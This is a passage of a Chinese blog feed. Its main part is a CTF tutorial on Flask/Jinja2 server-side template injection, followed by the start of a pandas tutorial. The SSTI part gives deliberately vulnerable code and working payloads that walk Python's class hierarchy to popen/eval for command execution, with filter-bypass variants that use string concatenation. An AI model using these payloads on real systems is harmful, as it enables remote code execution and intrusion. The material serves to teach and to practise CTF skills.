这会让操作系统监听所有公网 IP,此时便可以在公网上看到自己的web。

## 4.3 模板渲染（重点）
你可以使用 render_template() 方法来渲染模板。你需要做的一切就是将模板名和你想作为关键字的参数传入模板的变量。这里有一个展示如何渲染模板的简例:

简单的模版渲染示例
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import render_template</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;hello&#x2F;&#39;)</span><br><span class="line">@app.route(&#39;&#x2F;hello&#x2F;&lt;name&gt;&#39;)</span><br><span class="line">def hello(name&#x3D;None):</span><br><span class="line">        return render_template(&#39;hello.html&#39;, name&#x3D;name)&#x2F;&#x2F;我们hello.html模板未创建所以这段代码暂时供观赏，不妨往下继续看</span><br></pre></td></tr></table></figure>

我们从模板渲染开始实例，因为我们毕竟不是做开发的，flask以模板注入闻名- -！，所以我们先从flask模版渲染入手深入剖析。

首先要搞清楚，模板渲染体系，render_template函数渲染的是templates中的模板，所谓模板是我们自己写的html，里面的参数需要我们根据每个用户需求传入动态变量。
> ├── app.py  
> ├── static  
> │   └── style.css  
> └── templates  
>     └── index.html

![flask 目录](https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/flask_目录.png)

我们写一个index.html文件写templates文件夹中。
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;&#123;&#123;title&#125;&#125; - 小猪佩奇&lt;&#x2F;title&gt;</span><br><span class="line">  &lt;&#x2F;head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">      &lt;h1&gt;Hello, &#123;&#123;user.name&#125;&#125;!&lt;&#x2F;h1&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

里面有两个参数需要我们渲染，user.name，以及title

我们在app.py文件里进行渲染。

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">@app.route(&#39;&#x2F;index&#39;)#我们访问&#x2F;或者&#x2F;index都会跳转</span><br><span class="line">def index():</span><br><span class="line">   user &#x3D; &#123;&#39;name&#39;: &#39;小猪佩奇&#39;&#125;#传入一个字典数组</span><br><span class="line">   return render_template(&quot;index.html&quot;,title&#x3D;&#39;Home&#39;,user&#x3D;user)</span><br></pre></td></tr></table></figure>
![app image](https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/app_image.png)

Image这次渲染我们没有使用用户可控，所以是安全的，如果我们交给用户可控并且不过滤参数就有可能造成SSTI模板注入漏洞。

# 5. flask实战
此时我们环境已经搭建好了，可以进行更深一步的讲解了，以上好像我们讲解使用了php代码为啥题目是flask呢，没关系我们现在进入重点!!!--》》flask/jinja2模版注入

Flask是一个使用Python编写的轻量级web应用框架，其WSGI工具箱采用Werkzeug，模板引擎则使用Jinja2。这里我们提前给出漏洞代码。访问http://127.0.0.1:5000/test 即可
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import render_template</span><br><span class="line">from flask import request</span><br><span class="line">from flask import render_template_string</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line">@app.route(&#39;&#x2F;test&#39;,methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def test():</span><br><span class="line">    template &#x3D; &#39;&#39;&#39;</span><br><span class="line">        &lt;div class&#x3D;&quot;center-content error&quot;&gt;</span><br><span class="line">            &lt;h1&gt;Oops! That page doesn&#39;t exist.&lt;&#x2F;h1&gt;</span><br><span class="line">            &lt;h3&gt;%s&lt;&#x2F;h3&gt;</span><br><span class="line">        &lt;&#x2F;div&gt; </span><br><span class="line">    &#39;&#39;&#39; %(request.url)</span><br><span class="line"></span><br><span class="line">    return render_template_string(template)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.debug &#x3D; True</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

## 5.1 flask漏洞成因
为什么说我们上面的代码会有漏洞呢，其实对于代码功底比较深的师傅，是不会存在ssti漏洞的，被一些偷懒的师傅简化了代码，所以造成了ssti。上面的代码我们本可以写成类似如下的形式。
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;&#123;&#123;title&#125;&#125; - 小猪佩奇&lt;&#x2F;title&gt;</span><br><span class="line">  &lt;&#x2F;head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">      &lt;h1&gt;Hello, &#123;&#123;user.name&#125;&#125;!&lt;&#x2F;h1&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

里面有两个参数需要我们渲染，user.name，以及title

我们在app.py文件里进行渲染。

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">@app.route(&#39;&#x2F;index&#39;)#我们访问&#x2F;或者&#x2F;index都会跳转</span><br><span class="line">def index():</span><br><span class="line">   return render_template(&quot;index.html&quot;,title&#x3D;&#39;Home&#39;,user&#x3D;request.args.get(&quot;key&quot;))</span><br></pre></td></tr></table></figure>

也就是说，两种代码的形式是，一种当字符串来渲染并且使用了%(request.url)，另一种规范使用index.html渲染文件。我们漏洞代码使用了render_template_string函数，而如果我们使用render_template函数，将变量传入进去，现在即使我们写成了request，我们可以在url里写自己想要的恶意代码`&#123;&#123;&#125;&#125;</code>你将会发现如下：<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/flask_ssti.png"></p>
<p>即使username可控了，但是代码已经并不生效，并不是你错了，是代码对了。这里问题出在，良好的代码规范，使得模板其实已经固定了，已经被render_template渲染了。你的模板渲染其实已经不可控了。而漏洞代码的问题出在这里</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def test():</span><br><span class="line">    template &#x3D; &#39;&#39;&#39;</span><br><span class="line">        &lt;div class&#x3D;&quot;center-content error&quot;&gt;</span><br><span class="line">            &lt;h1&gt;Oops! That page doesn&#39;t exist.&lt;&#x2F;h1&gt;</span><br><span class="line">            &lt;h3&gt;%s&lt;&#x2F;h3&gt;</span><br><span class="line">        &lt;&#x2F;div&gt; </span><br><span class="line">    &#39;&#39;&#39; %(request.url)</span><br></pre></td></tr></table></figure>

<p>注意%（request.url），程序员因为省事并不会专门写一个html文件，而是直接当字符串来渲染。并且request.url是可控的，这也正是flask在CTF中经常使用的手段，报错404，返回当前错误url，通常CTF的flask如果是ssti，那么八九不离十就是基于这段代码，多的就是一些过滤和一些奇奇怪怪的方法函数。现在你已经明白了flask的ssti成因以及代码了。接下来我们进入实战。</p>
<h2 id="5-2-本地环境进一步分析"><a href="#5-2-本地环境进一步分析" class="headerlink" title="5.2 本地环境进一步分析"></a>5.2 本地环境进一步分析</h2><p>上面我们已经放出了漏洞代码无过滤版本。现在我们深究如何利用ssti攻击。</p>
<p>现在我们已经知道了在flask中 <code>&#123;&#123;&#125;&#125;</code>里面的代码将会执行。那么如何利用对于一个python小白可能还是一头雾水，如果之前没有深入学习过python，那么接下来可以让你对于poc稍微有点了解。进入正题。</p>
<p>在python中，object类是Python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。我们从这段话出发，假定你已经知道ssti漏洞了，但是完全没学过ssti代码怎么写，接下来你可能会学到一点废话。</p>
<p>我们在pycharm中运行代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(&quot;&quot;.__class__)</span><br></pre></td></tr></table></figure>

<p>返回了&lt;class ‘str’&gt;，对于一个空字符串他已经打印了str类型，在python中，每个类都有一个bases属性，列出其基类。现在我们写代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__bases__)</span><br></pre></td></tr></table></figure>

<p>打印返回(&lt;class ‘object’&gt;,)，我们已经找到了他的基类object，而我们想要寻找object类的不仅仅只有bases，同样可以使用mro，mro给出了method resolution order，即解析方法调用的顺序。我们实例打印一下mro。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__mro__)</span><br></pre></td></tr></table></figure>

<p>可以看到返回了(&lt;class ‘str’&gt;, &lt;class ‘object’&gt;)，同样可以找到object类，正是由于这些但不仅限于这些方法，我们才有了各种沙箱逃逸的姿势。正如上面的解释，mro返回了解析方法调用的顺序，将会打印两个。在flask ssti中poc中很大一部分是从object类中寻找我们可利用的类的方法。我们这里只举例最简单的。接下来我们增加代码。接下来我们使用subclasses,subclasses() 这个方法，这个方法返回的是这个类的子类的集合，也就是object类的子类的集合。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__bases__[0].__subclasses__())</span><br></pre></td></tr></table></figure>

<p>python 3.6 版本下的object类下的方法集合。这里要记住一点2.7和3.6版本返回的子类不是一样的，但是2.7有的3.6大部分都有。需要自己寻找合适的标号来调用接下来我将进一步解释。打印如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;, &lt;class &#39;NotImplementedType&#39;&gt;, &lt;class &#39;traceback&#39;&gt;, &lt;class &#39;super&#39;&gt;, &lt;class &#39;range&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;dict_keys&#39;&gt;, &lt;class &#39;dict_values&#39;&gt;, &lt;class &#39;dict_items&#39;&gt;, &lt;class &#39;odict_iterator&#39;&gt;, &lt;class &#39;set&#39;&gt;, &lt;class &#39;str&#39;&gt;, &lt;class &#39;slice&#39;&gt;, &lt;class &#39;staticmethod&#39;&gt;, &lt;class &#39;complex&#39;&gt;, &lt;class &#39;float&#39;&gt;, &lt;class &#39;frozenset&#39;&gt;, &lt;class &#39;property&#39;&gt;, &lt;class &#39;managedbuffer&#39;&gt;, &lt;class &#39;memoryview&#39;&gt;, &lt;class &#39;tuple&#39;&gt;, &lt;class &#39;enumerate&#39;&gt;, &lt;class &#39;reversed&#39;&gt;, &lt;class &#39;stderrprinter&#39;&gt;, &lt;class &#39;code&#39;&gt;, &lt;class &#39;frame&#39;&gt;, &lt;class &#39;builtin_function_or_method&#39;&gt;, &lt;class &#39;method&#39;&gt;, &lt;class &#39;function&#39;&gt;, &lt;class &#39;mappingproxy&#39;&gt;, &lt;class &#39;generator&#39;&gt;, &lt;class &#39;getset_descriptor&#39;&gt;, &lt;class &#39;wrapper_descriptor&#39;&gt;, &lt;class &#39;method-wrapper&#39;&gt;, &lt;class &#39;ellipsis&#39;&gt;, &lt;class &#39;member_descriptor&#39;&gt;, &lt;class &#39;types.SimpleNamespace&#39;&gt;, &lt;class &#39;PyCapsule&#39;&gt;, &lt;class &#39;longrange_iterator&#39;&gt;, &lt;class &#39;cell&#39;&gt;, &lt;class &#39;instancemethod&#39;&gt;, &lt;class &#39;classmethod_descriptor&#39;&gt;, &lt;class &#39;method_descriptor&#39;&gt;, &lt;class &#39;callable_iterator&#39;&gt;, &lt;class &#39;iterator&#39;&gt;, &lt;class &#39;coroutine&#39;&gt;, &lt;class &#39;coroutine_wrapper&#39;&gt;, &lt;class &#39;EncodingMap&#39;&gt;, &lt;class &#39;fieldnameiterator&#39;&gt;, &lt;class &#39;formatteriterator&#39;&gt;, &lt;class &#39;filter&#39;&gt;, &lt;class &#39;map&#39;&gt;, &lt;class &#39;zip&#39;&gt;, &lt;class &#39;moduledef&#39;&gt;, &lt;class &#39;module&#39;&gt;, &lt;class &#39;BaseException&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt;, &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt;, &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt;, &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &lt;class &#39;classmethod&#39;&gt;, &lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;, &lt;class &#39;_frozen_importlib._ImportLockContext&#39;&gt;, &lt;class &#39;_thread._localdummy&#39;&gt;, &lt;class &#39;_thread._local&#39;&gt;, &lt;class &#39;_thread.lock&#39;&gt;, &lt;class &#39;_thread.RLock&#39;&gt;, &lt;class &#39;_frozen_importlib_external.WindowsRegistryFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external._LoaderBasics&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external.PathFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt;, &lt;class &#39;_io._IOBase&#39;&gt;, &lt;class &#39;_io._BytesIOBuffer&#39;&gt;, &lt;class &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;class &#39;nt.ScandirIterator&#39;&gt;, &lt;class &#39;nt.DirEntry&#39;&gt;, &lt;class &#39;PyHKEY&#39;&gt;, &lt;class &#39;zipimport.zipimporter&#39;&gt;, &lt;class &#39;codecs.Codec&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;, &lt;class &#39;codecs.StreamRecoder&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;abc.ABC&#39;&gt;, &lt;class &#39;collections.abc.Hashable&#39;&gt;, &lt;class &#39;collections.abc.Awaitable&#39;&gt;, &lt;class &#39;collections.abc.AsyncIterable&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;collections.abc.Iterable&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;dict_keyiterator&#39;&gt;, &lt;class &#39;dict_valueiterator&#39;&gt;, &lt;class &#39;dict_itemiterator&#39;&gt;, &lt;class &#39;list_iterator&#39;&gt;, &lt;class &#39;list_reverseiterator&#39;&gt;, &lt;class &#39;range_iterator&#39;&gt;, &lt;class &#39;set_iterator&#39;&gt;, &lt;class &#39;str_iterator&#39;&gt;, &lt;class &#39;tuple_iterator&#39;&gt;, &lt;class &#39;collections.abc.Sized&#39;&gt;, &lt;class &#39;collections.abc.Container&#39;&gt;, &lt;class &#39;collections.abc.Callable&#39;&gt;, &lt;class &#39;os._wrap_close&#39;&gt;, &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;, &lt;class &#39;_sitebuiltins._Printer&#39;&gt;, &lt;class &#39;_sitebuiltins._Helper&#39;&gt;, &lt;class &#39;MultibyteCodec&#39;&gt;, &lt;class &#39;MultibyteIncrementalEncoder&#39;&gt;, &lt;class &#39;MultibyteIncrementalDecoder&#39;&gt;, &lt;class &#39;MultibyteStreamReader&#39;&gt;, &lt;class &#39;MultibyteStreamWriter&#39;&gt;, &lt;class &#39;functools.partial&#39;&gt;, &lt;class &#39;functools._lru_cache_wrapper&#39;&gt;, &lt;class &#39;operator.itemgetter&#39;&gt;, &lt;class &#39;operator.attrgetter&#39;&gt;, &lt;class &#39;operator.methodcaller&#39;&gt;, &lt;class &#39;itertools.accumulate&#39;&gt;, &lt;class &#39;itertools.combinations&#39;&gt;, &lt;class &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;class &#39;itertools.cycle&#39;&gt;, &lt;class &#39;itertools.dropwhile&#39;&gt;, &lt;class &#39;itertools.takewhile&#39;&gt;, &lt;class &#39;itertools.islice&#39;&gt;, &lt;class &#39;itertools.starmap&#39;&gt;, &lt;class &#39;itertools.chain&#39;&gt;, &lt;class &#39;itertools.compress&#39;&gt;, &lt;class &#39;itertools.filterfalse&#39;&gt;, &lt;class &#39;itertools.count&#39;&gt;, &lt;class &#39;itertools.zip_longest&#39;&gt;, &lt;class &#39;itertools.permutations&#39;&gt;, &lt;class &#39;itertools.product&#39;&gt;, &lt;class &#39;itertools.repeat&#39;&gt;, &lt;class &#39;itertools.groupby&#39;&gt;, &lt;class &#39;itertools._grouper&#39;&gt;, &lt;class &#39;itertools._tee&#39;&gt;, &lt;class &#39;itertools._tee_dataobject&#39;&gt;, &lt;class &#39;reprlib.Repr&#39;&gt;, &lt;class &#39;collections.deque&#39;&gt;, &lt;class &#39;_collections._deque_iterator&#39;&gt;, &lt;class &#39;_collections._deque_reverse_iterator&#39;&gt;, &lt;class &#39;collections._Link&#39;&gt;, &lt;class &#39;types.DynamicClassAttribute&#39;&gt;, &lt;class &#39;types._GeneratorWrapper&#39;&gt;, &lt;class &#39;weakref.finalize._Info&#39;&gt;, &lt;class &#39;weakref.finalize&#39;&gt;, &lt;class &#39;functools.partialmethod&#39;&gt;, &lt;class &#39;enum.auto&#39;&gt;, &lt;enum &#39;Enum&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;_sre.SRE_Pattern&#39;&gt;, &lt;class &#39;_sre.SRE_Match&#39;&gt;, &lt;class &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;sre_parse.Pattern&#39;&gt;, &lt;class &#39;sre_parse.SubPattern&#39;&gt;, &lt;class &#39;sre_parse.Tokenizer&#39;&gt;, &lt;class &#39;re.Scanner&#39;&gt;, &lt;class &#39;tokenize.Untokenizer&#39;&gt;, &lt;class &#39;traceback.FrameSummary&#39;&gt;, &lt;class &#39;traceback.TracebackException&#39;&gt;, &lt;class &#39;threading._RLock&#39;&gt;, &lt;class &#39;threading.Condition&#39;&gt;, &lt;class &#39;threading.Semaphore&#39;&gt;, &lt;class &#39;threading.Event&#39;&gt;, &lt;class &#39;threading.Barrier&#39;&gt;, &lt;class &#39;threading.Thread&#39;&gt;, &lt;class &#39;_winapi.Overlapped&#39;&gt;, &lt;class &#39;subprocess.STARTUPINFO&#39;&gt;, &lt;class &#39;subprocess.CompletedProcess&#39;&gt;, &lt;class &#39;subprocess.Popen&#39;&gt;]</span><br></pre></td></tr></table></figure>

<p>接下来就是我们需要找到合适的类，然后从合适的类中寻找我们需要的方法。这里开始我们不再用pycharm打印了，直接利用上面我们已经搭建好的漏洞环境来进行测试。通过我们在如上这么多类中一个一个查找，找到我们可利用的类，这里举例一种。&lt;class ‘os._wrap_close’&gt;，os命令相信你看到就感觉很亲切。我们正是要从这个类中寻找我们可利用的方法，通过大概猜测找到是第119个类，0也对应一个类，所以这里写[118]。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[118]&#125; &#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/flask_os_wrap_close.png" alt="flask os wrap close"></p>
<p>这个时候我们便可以利用.init.globals来找os类下的，init初始化类，然后globals全局来查找所有的方法及变量及参数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__&#125; &#125;</span><br></pre></td></tr></table></figure>

<p>此时我们可以在网页上看到各种各样的参数方法函数。我们找其中一个可利用的function popen，在python2中可找file读取文件，很多可利用方法，详情可百度了解下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#39;popen&#39;](&#39;dir&#39;).read()&#125; &#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/popen_read.png" alt="popen read"><br>此时便可以看到命令已经执行。如果是在linux系统下便可以执行其他命令。此时我们已经成功得到权限。进下来我们将进一步简单讨论如何进行沙箱逃逸。</p>
<h2 id="5-3-ctf中的一些绕过tips"><a href="#5-3-ctf中的一些绕过tips" class="headerlink" title="5.3 ctf中的一些绕过tips"></a>5.3 ctf中的一些绕过tips</h2><p>没什么系统思路。就是不断挖掘类研究官方文档以及各种能够利用的姿势。这里从最简单的绕过说起。</p>
<ol>
<li><p>过滤[]等括号<br><code>使用gititem绕过。如原poc &#123;&#123;&quot;&quot;.class.bases[0]&#125; &#125;</code></p>
<p><code>绕过后&#123;&#123;&quot;&quot;.class.bases.getitem(0)&#125; &#125;</code></p>
</li>
<li><p>过滤了subclasses，拼凑法<br><code>原poc&#123;&#123;&quot;&quot;.class.bases[0].subclasses()&#125; &#125;</code></p>
<p><code>绕过 &#123;&#123;&quot;&quot;.class.bases[0]&#39;subcla&#39;+&#39;sses&#39;&#125; &#125;</code></p>
</li>
<li><p>过滤class<br>使用session</p>
</li>
</ol>
<p>  <code> poc &#123;&#123;session[&#39;cla&#39;+&#39;ss&#39;].bases[0].bases[0].bases[0].bases[0].subclasses()[118]&#125; &#125;</code></p>
<p>   多个bases[0]是因为一直在向上找object类。使用mro就会很方便</p>
   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;session[&#39;__cla&#39;+&#39;ss__&#39;].__mro__[12]&#125; &#125;</span><br></pre></td></tr></table></figure>
<p>   或者<br>   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">request[&#39;__cl&#39;+&#39;ass__&#39;].__mro__[12]&#125; &#125;</span><br></pre></td></tr></table></figure></p>
<ol start="4">
<li><p>timeit姿势</p>
<p>可以学习一下 2017 swpu-ctf的一道沙盒python题，</p>
<p>这里不详说了，博大精深，我只意会一二。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import timeit</span><br><span class="line">timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;dir&#39;)&quot;,number&#x3D;1)</span><br><span class="line"></span><br><span class="line">import platform</span><br><span class="line">print platform.popen(&#39;dir&#39;).read()</span><br></pre></td></tr></table></figure></li>
<li><p>收藏的一些poc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls  &#x2F;var&#x2F;www&#x2F;html&quot;).read()&#39; )</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">&#123;&#123;request[&#39;__cl&#39;+&#39;ass__&#39;].__base__.__base__.__base__[&#39;__subcla&#39;+&#39;sses__&#39;]()[60][&#39;__in&#39;+&#39;it__&#39;][&#39;__&#39;+&#39;glo&#39;+&#39;bal&#39;+&#39;s__&#39;][&#39;__bu&#39;+&#39;iltins__&#39;][&#39;ev&#39;+&#39;al&#39;](&#39;__im&#39;+&#39;port__(&quot;os&quot;).po&#39;+&#39;pen(&quot;ca&quot;+&quot;t a.php&quot;).re&#39;+&#39;ad()&#39;)&#125; &#125;</span><br></pre></td></tr></table></figure>
<p>还有就可以参考一下P师傅的 <a href="https://p0sec.net/index.php/archives/120/">https://p0sec.net/index.php/archives/120/</a></p>
</li>
</ol>
<h1 id="6-漏洞挖掘"><a href="#6-漏洞挖掘" class="headerlink" title="6. 漏洞挖掘"></a>6. 漏洞挖掘</h1><p>对于一些师傅可能更偏向于实战，但是不幸的是实战中几乎不会出现ssti模板注入，或者说很少，大多出现在python 的ctf中。但是我们还是理性分析下。</p>
<p>每一个（重）模板引擎都有着自己的语法（点）,Payload 的构造需要针对各类模板引擎制定其不同的扫描规则,就如同 SQL 注入中有着不同的数据库类型一样。更改请求参数使之承载含有模板引擎语法的 Payload,通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析,不同的引擎不同的解析。所以我们在挖掘之前有必要对网站的web框架进行检查，否则很多时候<code>&#123;&#123;&#125; &#125;</code>并没有用，导致错误判断。</p>
<p>接下来附张图，实战中要测试重点是看一些url的可控，比如url输入什么就输出什么。前期收集好网站的开发语言以及框架，防止错误利用<code>&#123;&#123;&#125; &#125;</code>而导致错误判断。如下图较全的反映了ssti的一些模板渲染引擎及利用。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/ssti.png" alt="ssti"></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>CTF</category>
        <category>《从0到1：CTFer成长之路》</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>pandas</title>
    <url>/pandas/</url>
    <content><![CDATA[<p>pandas 学习</p>
<span id="more"></span>

<h1 id="1-Pandas-介绍"><a href="#1-Pandas-介绍" class="headerlink" title="1 | Pandas 介绍"></a>1 | Pandas 介绍</h1><ul>
<li>以 Numpy 为基础，借力 Numpy 模块在计算方面性能高的优势</li>
<li>封装了Matplotlib、Numpy的画图和计算</li>
<li>独特的数据结构，便捷的数据处理能力</li>
<li>读取文件方便</li>
</ul>
<h1 id="2-Pandas-数据结构"><a href="#2-Pandas-数据结构" class="headerlink" title="2 | Pandas 数据结构"></a>2 | Pandas 数据结构</h1><h2 id="2-1-Series"><a href="#2-1-Series" class="headerlink" title="2.1 Series"></a>2.1 Series</h2><p>Series是一个类似于一维数组的数据结构，它能够保存任何类型的数据，比如整数、字符串、浮点数等，主要由一组数据和与之相关的索引两部分构成。<br><img src="Series.png" alt="Series"></p>
<h3 id="2-1-1-Series的创建"><a href="#2-1-1-Series的创建" class="headerlink" title="2.1.1 Series的创建"></a>2.1.1 Series的创建</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入pandas</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">pd.Series(data=<span class="literal">None</span>, index=<span class="literal">None</span>, dtype=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>参数<ul>
<li>data：传入的数据，可以是 ndarray、list 等</li>
<li>index：索引，必须是唯一的，且与数据的长度相等。如果没有传入索引参数，则默认会自动创建一个从 0-N 的整数索引。</li>
<li>dtype：数据的类型</li>
</ul>
</li>
<li>通过已有数据创建<ul>
<li>指定内容，默认索引<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pd.Series(np.arange(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line"><span class="number">0</span>    <span class="number">0</span></span><br><span class="line"><span class="number">1</span>    <span class="number">1</span></span><br><span class="line"><span class="number">2</span>    <span class="number">2</span></span><br><span class="line"><span class="number">3</span>    <span class="number">3</span></span><br><span class="line"><span class="number">4</span>    <span class="number">4</span></span><br><span class="line"><span class="number">5</span>    <span class="number">5</span></span><br><span class="line"><span class="number">6</span>    <span class="number">6</span></span><br><span class="line"><span class="number">7</span>    <span class="number">7</span></span><br><span class="line"><span class="number">8</span>    <span class="number">8</span></span><br><span class="line"><span class="number">9</span>    <span class="number">9</span></span><br><span class="line">dtype: int64</span><br></pre></td></tr></table></figure></li>
<li>指定索引<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pd.Series([<span class="number">6.7</span>,<span class="number">5.6</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">2</span>], index=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line"><span class="number">1</span>     <span class="number">6.7</span></span><br><span class="line"><span class="number">2</span>     <span class="number">5.6</span></span><br><span class="line"><span class="number">3</span>     <span class="number">3.0</span></span><br><span class="line"><span class="number">4</span>    <span class="number">10.0</span></span><br><span class="line"><span class="number">5</span>     <span class="number">2.0</span></span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure></li>
